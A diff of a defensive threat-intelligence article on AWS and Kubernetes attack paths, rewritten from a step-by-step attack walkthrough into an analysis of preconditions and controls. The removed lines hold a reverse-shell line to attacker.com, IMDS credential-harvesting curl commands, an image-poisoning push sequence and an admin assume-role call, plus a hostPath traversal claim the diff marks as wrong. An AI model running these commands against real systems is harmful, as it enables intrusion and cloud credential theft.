@@ -1,200 +1,255 @@
 ---
-title: "Advanced Cloud Attack Path Analysis: Mapping Multi-Stage Exploits to the MITRE ATT&CK Matrix"
-type: threat-intel
-tags: [Threat Intelligence, Attack Paths, MITRE ATT&CK, Cloud Security, Privilege Escalation]
-date: 2026-06
-readingTime: 20
+title: "Cloud and Kubernetes Attack Paths: Preconditions, Enforcement Points, and Broken Links"
+type: "threat-intel"
+tags:
+  - threat-intelligence
+  - attack-paths
+  - aws
+  - kubernetes
+  - software-supply-chain
+date: "2026-06-01"
+lastReviewed: "2026-07-23"
+readingTime: 18
+reviewStatus: "partially-verified"
+validatedAgainst:
+  - "MITRE ATT&CK Enterprise v19.1 cloud, container, credential, and supply-chain techniques checked 2026-07-23"
+  - "AWS IMDS, ECR, and IAM documentation checked 2026-07-23"
+  - "Kubernetes hostPath, Node authorization, Pod Security Standards, and service-account documentation checked 2026-07-23"
+  - "Kubernetes and Kyverno fixtures at labs/kubernetes-security"
+sourceQuality: "primary-sources-reviewed"
+implementationStatus: "partially-tested"
+reviewIntervalDays: 180
 ---
 
-# Advanced Cloud Attack Path Analysis: Mapping Multi-Stage Exploits to the MITRE ATT&CK Matrix
+# Cloud and Kubernetes attack paths
 
-## Executive Summary
+An attack path is a conditional chain. Each edge requires a capability, trust
+relationship, routing path, or control failure. A leaked credential does not by
+itself prove registry write access; a compromised image does not deploy itself; a
+container cannot escape an arbitrary `hostPath` mount by traversing `..`; and a node
+credential does not automatically authorize cloud administration.
 
-Cloud threat landscapes have evolved beyond simple, single-stage exploits. Modern adversaries construct complex, multi-stage attack paths that traverse identity boundaries, exploit network configurations, and compromise container orchestration planes. A single, isolated vulnerability—such as an open security group or a development access key leak—may appear low-risk on its own. However, when chained together with other configurations, it can lead directly to full platform takeover.
+This investigation models one plausible AWS and Kubernetes chain, records the exact
+preconditions, and identifies controls that break individual edges. It is a
+primary-source synthesis with a partially tested policy lab, not a reproduction of a
+real incident.
 
-At scale, security teams often analyze vulnerabilities in isolation, failing to see how an attacker can connect them to build an exploitation path. Understanding these paths requires mapping attacker techniques to the MITRE ATT&CK Cloud Matrix. This whitepaper analyzes a complete, multi-stage cloud and Kubernetes attack chain. It demonstrates how an attacker pivots from a compromised developer workspace to ECR container poisoning, schedules privileged pods, and escalates to full AWS cloud administration.
+## Scope and non-goals
 
----
+In scope:
 
-## Threat Model and Attack Surface
+- developer or build identity compromise;
+- mutable image replacement and deployment trust;
+- risky Pod and node access;
+- EC2 Instance Metadata Service (IMDS) reachability;
+- worker-role permissions and cross-account role trust; and
+- admission, identity, network, and runtime control points.
 
-The cloud attack surface is highly dynamic. Attackers target developer endpoints, build systems, registry storage, container environments, and IAM metadata services to build paths to target resources.
+Out of scope:
 
-```
-       [ Stolen Developer AWS Access Key ]
-                       │
-                       ▼ (T1586: Compromise Accounts)
-       [ Access ECR Registry Subnet ]
-                       │
-                       ▼ (T1204: User Execution)
-     [ Inject Backdoor into Container Image ]
-                       │
-                       ▼ (T1195: Supply Chain Compromise)
-    [ Poisoned Image deployed to K8s Cluster ]
-                       │
-                       ▼ (T1611: Escape to Host Node)
-    [ Mount HostPath to extract Worker IAM Credentials ]
-                       │
-                       ▼ (T1078: Valid Accounts)
-   [ Assume Admin Role via Metadata Service ]
-                       │
-                       ▼
-          [ Full Cloud Account Control ]
-```
+- exploitation of a specific container-runtime CVE;
+- an assertion that a named organization experienced this chain;
+- a live EKS or AWS account test; and
+- universal ATT&CK mappings for every implementation.
 
-### Threat Vectors and Kill-Chains
-
-1. **Initial Access via Stolen Developer Keys (T1586)**:
-   - The attacker extracts active AWS access keys from a developer's local `.aws/credentials` file via malware on their workstation.
-2. **Persistence and Supply Chain Poisoning (T1195)**:
-   - The attacker uses the stolen credentials to access the enterprise Elastic Container Registry (ECR). They download a production container image, inject a reverse-shell payload, and push the poisoned image back to ECR, overwriting the `production-latest` tag.
-3. **Privilege Escalation via Node Containment Breakout (T1611)**:
-   - The poisoned container is deployed to the production Kubernetes cluster. Once running, the container exploits a hostPath mount configuration to access the underlying worker node's directory structure.
-4. **Credential Harvesting via Instance Metadata Service (T1552)**:
-   - From the worker node, the attacker queries the EC2 Instance Metadata Service (IMDSv2) to harvest the node's IAM role credentials, pivoting from Kubernetes access to AWS cloud provider access.
-5. **Control Plane Takeover via AssumeRole (T1078)**:
-   - The attacker uses the node's IAM credentials to assume a high-privilege cross-account administration role, completing the attack chain.
+## Trust boundaries and preconditions
 
 ```mermaid
 flowchart LR
-    A["1 - Stolen Dev Keys<br/>T1586"] --> B["2 - ECR Image Poisoning<br/>T1195"]
-    B --> C["3 - K8s Node Breakout<br/>T1611"]
-    C --> D["4 - IMDS Credential<br/>Harvest T1552"]
-    D --> E["5 - Cross-Account<br/>AssumeRole T1078"]
-
-    style A fill:#dc2626,color:#fff,stroke:#991b1b
-    style B fill:#ea580c,color:#fff,stroke:#c2410c
-    style C fill:#d97706,color:#fff,stroke:#b45309
-    style D fill:#ca8a04,color:#fff,stroke:#a16207
-    style E fill:#9333ea,color:#fff,stroke:#7e22ce
+  A["Compromised developer/build principal"] -->|"1. Registry push is authorized"| B["Altered image or manifest"]
+  B -->|"2. Deployment consumes attacker-controlled reference"| C["Attacker code in Pod"]
+  C -->|"3. Explicit host/node capability exists"| D["Node credential or metadata path"]
+  D -->|"4. Node cloud role authorizes useful APIs"| E["Cloud resource access"]
+  E -->|"5. STS permissions and target trust both allow"| F["Higher-privilege role session"]
 ```
 
----
+Every numbered edge is independently testable:
 
-## Deep Technical Body
+| Edge | Required preconditions | Evidence to collect |
+| --- | --- | --- |
+| 1. Principal → registry | Valid credential/session; repository action such as ECR layer upload and image put; no denying SCP/resource policy/session boundary | CloudTrail identity, session tags/name, repository policy, effective IAM reachability |
+| 2. Registry → workload | Mutable tag or attacker-controlled digest/manifest; deploy automation selects it; admission does not reject identity/provenance | Deployment manifest, resolved digest, admission decision, promotion record |
+| 3. Pod → node | Runtime escape vulnerability **or** explicitly dangerous Pod capability such as a broad/sensitive `hostPath`, host namespace, privileged mode, or unsafe device/socket mount | Admitted Pod, policy exception, node/runtime telemetry |
+| 4. Node path → credentials | Credential file/socket is actually exposed, or Pod-to-IMDS routing works; token/hop-limit requirements are satisfied | Mounted host path, network trace, IMDS options, CNI/iptables behavior |
+| 5. Credentials → privilege | Source identity permits `sts:AssumeRole`; destination trust accepts the principal and conditions; boundaries/SCPs/session policies do not deny; assumed role permissions reach the target | IAM trust and permission policies, Access Analyzer, CloudTrail STS and denied API events |
 
-### Step-by-Step Anatomy of the Attack Path
+If any precondition is absent, that edge is not demonstrated.
 
-#### Stage 1: Initial Access & ECR Registry Poisoning
-The attacker discovers a leaked AWS Access Key in public developer logs or extracts it from a compromised local workstation.
-* **API Probe**:
-  ```bash
-  aws sts get-caller-identity
-  ```
-  The response reveals the key belongs to `arn:aws:iam::123456789012:user/dev-jason`.
-* **Registry Push**: The developer key has write-access to the ECR registry. The attacker logs into ECR, pulls the core API image, adds a malicious entrypoint (reverse shell), and pushes it back:
-  ```bash
-  aws ecr get-login-password --region us-west-2 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-west-2.amazonaws.com
-  docker pull 123456789012.dkr.ecr.us-west-2.amazonaws.com/api-service:latest
-  # Injects: /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
-  docker build -t 123456789012.dkr.ecr.us-west-2.amazonaws.com/api-service:latest .
-  docker push 123456789012.dkr.ecr.us-west-2.amazonaws.com/api-service:latest
-  ```
+## Correct hostPath semantics
 
-#### Stage 2: Deployment & Kubernetes Pod Hijacking
-The CI/CD pipeline triggers a rolling update, pulling the poisoned `api-service:latest` image and deploying it. The pod spawns and connects back to the attacker's listener.
+A Pod that mounts host `/var/log` at container `/var/log` sees that mounted subtree.
+The container path:
 
-#### Stage 3: Escape to Host Node via hostPath Mounts
-The attacker inspects the pod configuration and discovers that `/var/log` is mounted from the host:
-
-```yaml
-volumeMounts:
-- name: log-dir
-  mountPath: /var/log
-...
-volumes:
-- name: log-dir
-  hostPath:
-    path: /var/log
+```text
+/var/log/../../../etc/kubernetes/kubelet.conf
 ```
 
-The attacker uses this access to traverse directories and read the host's kubelet configuration containing node credentials:
-```bash
-cat /var/log/../../../etc/kubernetes/kubelet.conf
-```
-They extract the client certificate and private key, allowing them to send commands directly to the API server as a Kubernetes Node.
+does **not** escape the mount to arbitrary host-root siblings. Path resolution occurs
+inside the container mount namespace. A node-file attack instead requires a mount
+whose configured host path contains the target, for example a broad host-root mount,
+a sensitive `/etc/kubernetes` mount, a container-runtime socket, or another genuine
+node escape.
 
-#### Stage 4: Cloud Pivot via IMDSv2 Harvesting
-Using node-level permissions, the attacker bypasses container restrictions. They query the EC2 Instance Metadata Service from the node to extract the node's AWS IAM role credentials:
+`hostPath` risk is contextual: mounted host path, read/write mode, host permissions,
+container user/capabilities, SELinux/AppArmor policy, runtime, and node configuration
+all matter. A read-only log mount is not equivalent to a writable host-root mount.
 
-```bash
-# Get session token for IMDSv2
-TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+## Node identity precision
 
-# Fetch temporary role credentials
-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/EKS-Worker-Node-Role
-```
+Kubernetes Node authorization does not give a kubelet an unrestricted cluster-wide
+secret read. It authorizes a node for resources related to Pods scheduled to that
+node, subject to the configured authorizers and NodeRestriction admission behavior.
+A stolen node credential remains serious, but the reachable API objects must be
+measured rather than described as every cluster secret.
 
-The attacker configures these temporary keys on their local workstation.
+Cloud permissions are separate. An EKS worker role may pull images and operate node
+components without being allowed to assume an administrator role. The escalation
+edge exists only when both the source permissions and target trust policy accept the
+operation.
 
-#### Stage 5: Privilege Escalation to Admin Role
-The EKS worker node role has trust permissions to assume administrative roles for maintenance. The attacker calls STS to assume the role:
+## IMDS behavior is topology-dependent
 
-```bash
-aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdministratorAccess --role-session-name AttackSession
-```
+Requiring IMDSv2 prevents IMDSv1 requests and requires a session token. The response
+hop limit influences whether a response survives the network path, but `1` is not a
+universal “blocks every Pod” switch. Container networking topology, host networking,
+proxies, CNIs, and node configuration change the effective hops.
 
-The server returns temporary administrator credentials, giving the attacker full control of the AWS cloud account.
+Use several layers:
 
----
+- block Pod access to `169.254.169.254` in the enforced node/CNI path;
+- require IMDSv2 and select a tested hop limit;
+- keep node-role permissions narrow;
+- use workload identity for Pod-specific cloud permissions;
+- avoid host networking except reviewed system workloads; and
+- alert on unexpected IMDS and STS activity.
 
-## Defensive Architecture
+Validate the result in each cluster; do not infer it from one metadata setting.
 
-Preventing multi-stage attacks requires breaking compilation links and applying strict verification gates at every transition.
+## Attack path and control breaks
 
-### Architecture Topology: Hardened Deployment and Runtime Isolation
+### 1. Compromised build or developer identity
+
+An attacker obtains a valid credential or workflow capability. The consequential
+question is effective authorization: can that session push an image, replace a tag,
+change a deployment manifest, dispatch a privileged workflow, or modify a reusable
+workflow?
+
+Break the edge with short-lived federation, protected environments, exact OIDC
+subject/audience constraints, dedicated publisher roles, branch protections,
+reviewed action pins, and denial telemetry. Rotation alone does not reduce an active
+session's permissions.
+
+### 2. Artifact or deployment substitution
+
+The attacker publishes a digest or changes a mutable tag. The path continues only if
+release automation promotes the attacker-controlled reference.
+
+Break the edge by building in a protected context, recording provenance, promoting a
+reviewed digest, and verifying signer/workflow identity and predicate policy at
+admission. An SBOM or valid signature does not establish that an artifact is benign.
+
+The [supply-chain lab](../labs/supply-chain/README.md) demonstrates digest/provenance
+policy and tamper rejection. The
+[Kyverno lab](../labs/kubernetes-security/README.md) validates current
+`ImageValidatingPolicy` structure and negative identity fixtures. It does not perform
+online Sigstore cryptography.
+
+### 3. Pod-to-node capability
+
+Attacker code runs in the workload boundary. The chain needs an actual node path:
+privileged execution, host namespaces, a sensitive host mount/socket/device, a
+runtime/kernel vulnerability, or an authorized debug path.
+
+Break the edge with Pod Security Admission, a current admission policy, narrow
+exceptions, `automountServiceAccountToken: false` where API identity is unnecessary,
+non-root/read-only/seccomp/capability controls, runtime isolation, and node-pool or
+cluster separation for hostile tenants.
+
+Sandboxed runtimes can reduce the kernel attack surface. They do not themselves
+reject a dangerous `hostPath`; admission and platform policy own that decision.
+
+### 4. Node or metadata credential use
+
+After obtaining an exposed node credential or a working IMDS route, the attacker is
+limited by that principal's effective permissions and organization guardrails.
+Alert on unusual IMDS token requests, node-role API use outside expected services,
+new STS session destinations, and calls from unexpected network or workload context.
+
+### 5. Cross-account or higher-privilege role assumption
+
+AWS evaluates the caller's permission and the target role's trust policy, followed
+by boundaries, session policies, organization controls, and the assumed role's own
+authorization. A successful token or signature check is not the same as successful
+role assumption, and a role session is not proof that a later API call is allowed.
+
+The [IAM federation lab](../labs/iam-oidc/README.md) exercises trust claims,
+permission-boundary protections, external ID, session tags, and restricted
+`iam:PassRole` using structural policy tests.
+
+## Defensive architecture
 
 ```mermaid
 flowchart TD
-    COMMIT["Code Commit"] -->|Verifies Commit Signature| SCAN["Static Scanner"]
-    SCAN --> BUILD["Ephemeral Builder"]
-    BUILD -->|Signs Image via Cosign| REG["Container Registry"]
-    REG --> KYV["Kubernetes Admission<br/>Controller - Kyverno"]
-    KYV -->|Enforces Image Signatures| GVISOR["Sandboxed Worker Node<br/>gVisor"]
-    GVISOR -->|Blocks HostPath Mounts| IMDS["IMDS Restricted<br/>Hop Limit 1 - Blocks Pods"]
-
-    style COMMIT fill:#2563eb,color:#fff,stroke:#1d4ed8
-    style SCAN fill:#0891b2,color:#fff,stroke:#0e7490
-    style BUILD fill:#7c3aed,color:#fff,stroke:#6d28d9
-    style REG fill:#0891b2,color:#fff,stroke:#0e7490
-    style KYV fill:#d97706,color:#fff,stroke:#b45309
-    style GVISOR fill:#059669,color:#fff,stroke:#047857
-    style IMDS fill:#dc2626,color:#fff,stroke:#b91c1c
+  PR["Untrusted source / PR"] --> VALIDATE["Credential-free validation"]
+  VALIDATE --> BUILD["Protected ephemeral build"]
+  BUILD --> EVIDENCE["Digest + signature + provenance"]
+  EVIDENCE --> ADMISSION["Fail-closed admission identity policy"]
+  ADMISSION --> POD["Restricted Pod / runtime class"]
+  POD --> NET["CNI/node egress control incl. IMDS"]
+  NET --> IAM["Workload identity + narrow node role"]
+  IAM --> MON["Admission, runtime, CloudTrail and STS evidence"]
 ```
 
-* **Restrict IMDS Hop Limit**: Configure the EC2 Instance Metadata Service hop limit to 1. This prevents pods (which add a network hop) from querying the metadata service, restricting IMDS access exclusively to the host node.
-* **Block hostPath and Privileged Pods**: Enforce Kyverno policies to reject any pod attempting to use hostPath mounts or run as privileged.
+No single box proves the chain is broken. Test each transition and retain the
+resolved digest, policy version, decision, exception, principal, and cloud denial or
+success event.
 
----
+## Verification and negative tests
 
-## Tooling and Implementation
+Run:
 
-Implement a defense-in-depth monitoring chain using specialized tools:
+```text
+node labs/kubernetes-security/tests/run-tests.js
+kyverno test labs/kubernetes-security --remove-color
+node labs/iam-oidc/tests/run-tests.js
+node labs/supply-chain/tests/run-tests.js
+```
 
-1. **Kyverno / OPA Gatekeeper**: Deploy admission controllers to enforce Pod Security Standards, blocking hostPath mounts and restricting pod capabilities.
-2. **Aqua Security Trivy / Sysdig Falco**: Use Trivy to scan images in the registry for vulnerabilities, and deploy Falco to monitor container runtime activity, alerting on anomalous shell executions or file system traversals.
-3. **IMDS Protection Configuration**: Use the AWS CLI to enforce IMDSv2 and restrict the metadata response hop limit:
-   ```bash
-   aws ec2 modify-instance-metadata-options --instance-id i-0123456789abcdef0 --http-tokens required --http-put-response-hop-limit 1
-   ```
+Negative fixtures cover privileged Pods, host namespaces, sensitive `hostPath`,
+added capabilities, missing resource constraints, token automount, unsigned/wrong
+image identity, wrong OIDC claims, boundary removal, unauthorized `PassRole`, and
+artifact/provenance substitution.
 
----
+These tests do not launch EKS, contact IMDS, query AWS IAM, or exploit a runtime. A
+production review additionally needs server-side dry runs, cluster/CNI tests, IAM
+Access Analyzer and authorized simulation, registry verification, and runtime
+telemetry.
 
-## Attack Path Security Audit Checklist
+## Operations and residual risk
 
-| Item | Focus Area | Verification Step / Command | Target State |
-| :--- | :--- | :--- | :--- |
-| 1 | IMDS Configuration | Run `aws ec2 describe-instances` and inspect metadata options. | `HttpTokens` is set to `required` and `HttpGetResponseHopLimit` is set to `1`. |
-| 2 | Pod Volume Scopes | Search pod specifications for `hostPath` mounts. | `hostPath` mounts are blocked; pods use persistent volume claims or secure empty directories. |
-| 3 | ECR Access Scope | Review IAM policies assigned to developer and runner accounts. | Write access to ECR is restricted to dedicated build pipeline service roles. |
-| 4 | Image Signatures | Confirm if the cluster blocks unsigned container deployments. | Unsigned images are rejected by the admission controller. |
-| 5 | Runtime Alerting | Check if container shell executions generate security events. | Falco rules trigger high-priority alerts in the central SIEM. |
-| 6 | Access Key Rotation | Review the age of active developer access keys. | Active keys are rotated or disabled after 90 days. |
+Roll out blocking controls as:
 
----
+```text
+observe → audit → warn → enforce → measure bypasses
+```
+
+Track policy denials, exceptions and expiry, unsigned-image attempts, unexpected
+registry writes, mutable-tag deployments, Pod-to-IMDS attempts, node-role API calls,
+STS trust failures, and break-glass use. Test rollback without disabling unrelated
+boundaries.
+
+Residual risks include compromised authorized maintainers, build-platform compromise,
+validly signed malicious source, admission/controller outage or exemption abuse,
+runtime zero-days, CNI gaps, overprivileged node/workload roles, and missing or
+delayed telemetry.
 
 ## References
 
-* *MITRE ATT&CK Matrix for Cloud*: [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
-* *AWS EC2 Instance Metadata Service v2 Security*: [AWS Security Blog](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)
-* *Kubernetes Container Breakout Mitigation*: [SIG-Security Best Practices Guide](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
+- [MITRE ATT&CK Enterprise techniques](https://attack.mitre.org/techniques/enterprise/)
+- [AWS ECR identity and repository policies](https://docs.aws.amazon.com/AmazonECR/latest/userguide/security_iam_service-with-iam.html)
+- [AWS IMDS configuration](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
+- [AWS role trust and principal permissions](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic_policy-eval-denyallow.html)
+- [Kubernetes volumes and hostPath warning](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
+- [Kubernetes Node authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/)
+- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
+- [Kubernetes service-account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
